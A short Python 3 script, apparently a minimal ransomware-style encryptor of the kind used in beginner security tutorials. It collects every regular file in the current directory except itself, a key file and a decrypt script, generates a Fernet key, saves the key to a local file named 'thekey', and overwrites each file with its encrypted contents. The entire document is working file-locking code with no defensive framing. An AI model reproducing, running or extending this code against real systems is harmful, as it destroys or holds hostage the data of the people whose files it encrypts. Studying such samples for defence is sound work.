#!/usr/bin/python3 

import os
from cryptography.fernet import Fernet

files = []

for i in os.listdir():
    if i == "encrypt.py" or i == "thekey" or i == "decrypt.py":
        continue
    if os.path.isfile(i):
        files.append(i)

print(files)

key = Fernet.generate_key()

with open("thekey", "wb") as thekey:
    thekey.write(key)

for i in files:
    with open(i, "rb") as file:
        contents = file.read()
    encrypted = Fernet(key).encrypt(contents)
    with open(i, "wb") as file:
        file.write(encrypted)

